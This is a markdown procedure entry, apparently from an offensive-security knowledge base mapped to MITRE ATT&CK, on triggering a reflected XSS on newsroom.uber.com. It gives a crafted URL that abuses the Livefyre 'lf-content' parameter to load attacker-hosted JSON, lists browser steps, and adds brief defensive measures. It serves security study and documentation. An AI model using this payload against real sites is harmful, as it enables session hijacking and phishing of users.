---
id: p-trigger-xss-crafted-url
tags:
  - xss
  - exploit
  - drive-by
type: procedure
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.704Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Trigger XSS via Crafted URL

## Summary

This procedure delivers the reflected XSS payload by constructing and visiting a malicious URL that causes the Livefyre script to load and execute JavaScript from the attacker's JSON in the context of newsroom.uber.com.

## Description

The crafted URL uses the vulnerable 'lf-content' parameter to point to the attacker's domain and specific collection/content IDs. Upon page load, the script fetches the JSON and inserts 'bodyHtml' without sanitization, leading to arbitrary JS execution. This can result in session hijacking or phishing. No special tools needed beyond a browser.

## Requirements

1. Valid crafted URL with attacker domain
2. Hosted malicious JSON from prior procedure
3. Victim browser without XSS protections (or bypassed)

## Defense

Defensive measures and detection strategies:

- URL parameter validation and encoding
- DOMPurify or similar for HTML sanitization
- Browser-based XSS auditors or WAF rules for script injection

## Objectives

1. Induce fetch of malicious JSON on target domain
2. Achieve JS execution in high-privilege context
3. Validate impact like alert or data exfil

## Instructions

### Step 1: Construct the Malicious URL

**Context**: Build the URL using the vulnerable parameter format.

Format as: https://newsroom.uber.com/?lf-content=your-domain/uber.php?:131560603:307477931. Replace your-domain with your controlled domain.

**Expected Output**: Well-formed URL ready for delivery.

### Step 2: Visit the URL in Browser

**Context**: Load the page to trigger the fetch and injection.

Paste the URL into a browser address bar and press Enter. Monitor the Network tab for the fetch to bootstrap.your-domain/uber.php.

**Expected Output**: Page loads, JSON fetched, and bodyHtml injected.

### Step 3: Observe Execution

**Context**: Confirm XSS by checking for payload effects.

Look for the marquee text and alert popup displaying 'XSS on newsroom.uber.com'. Inspect DOM for inserted elements.

**Expected Output**: Alert fires, confirming execution in uber.com context.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- Web browser

## Tags

- [[xss]]
- [[exploit]]
- [[drive-by]]
